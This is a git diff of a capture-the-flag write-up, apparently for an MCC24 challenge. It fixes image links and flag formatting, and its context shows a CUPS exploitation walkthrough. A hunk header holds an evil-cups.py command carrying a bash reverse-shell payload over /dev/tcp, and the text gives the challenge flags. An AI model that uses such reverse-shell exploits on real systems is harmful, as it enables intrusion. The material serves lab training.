@@ -13,7 +13,7 @@ for i in $(seq 254); do ping 172.20.10.$i -c1 -W1 & done | grep from
 
 Make sure the IP address that we going to scan is within the subnet which is **172.20.10** 
 
-![Other Linux 5.x kernel 64-bit-2024-11-29-15-30-51](./static/Other Linux 5.x kernel 64-bit-2024-11-29-15-30-51.png)
+![Other Linux 5.x kernel 64-bit-2024-11-29-15-30-51](./static/idk2namethis.png)
 
 ### Step 3: Use Nmap to scan open ports of the machine
 
@@ -99,7 +99,7 @@ The wireshark filter to narrow down on port knocking action is this:
 ip.addr==192.168.248.151 && ip.addr==192.168.248.137 && (tcp.flags.syn == 1 && tcp.flags.ack == 0)
 ```
 
-![[screenshot.png]]
+![screenshot](./static/screenshot.png)
 
 
 ### Step 9: Port Knocking on PCAP (TCP.SYN.ACK to open port 631)
@@ -156,22 +156,22 @@ python3 evil-cups.py 172.20.10.4 172.20.10.6 'bash -c "bash -i >& /dev/tcp/172.2
 ![image](./static/image.webp)
 
 Once we enter the victim machine, the first flag is located at `/home/lp`, we can cat the `initial_flag.txt`
-**1st Flag:** `MCC24{h3ll0_fr0m_pr1nt1ng_s3rv1c3s`
+**1st Flag:** `MCC24{h3ll0_fr0m_pr1nt1ng_s3rv1c3s}`
 
 ### Step 12: Use tools suid3num to enumerate 
 
-![[image.png]]
+![image](./static/image.png)
 We have tried running linpeas but unfortunately it does not work due to timeout. So, we opt for suid3num enumeration to perform privilege escalation. 
 
-![[image (1).png]]
+![image (1)](./static/image (1).png)
 
 Now, we have found the second flag.
 
-**2nd Flag:** MCC24{4bus1ng_su1d}
+**2nd Flag:** `MCC24{4bus1ng_su1d}`
 
 ### Step 13: Found last flag with alexander's privilege at home directory 
 
-![[image (1).webp]]
+![image (1)](./static/image (1).webp)
 
 **3rd Flag:** `MCC24{g00d_j0b_3v3ry0n3}`
 
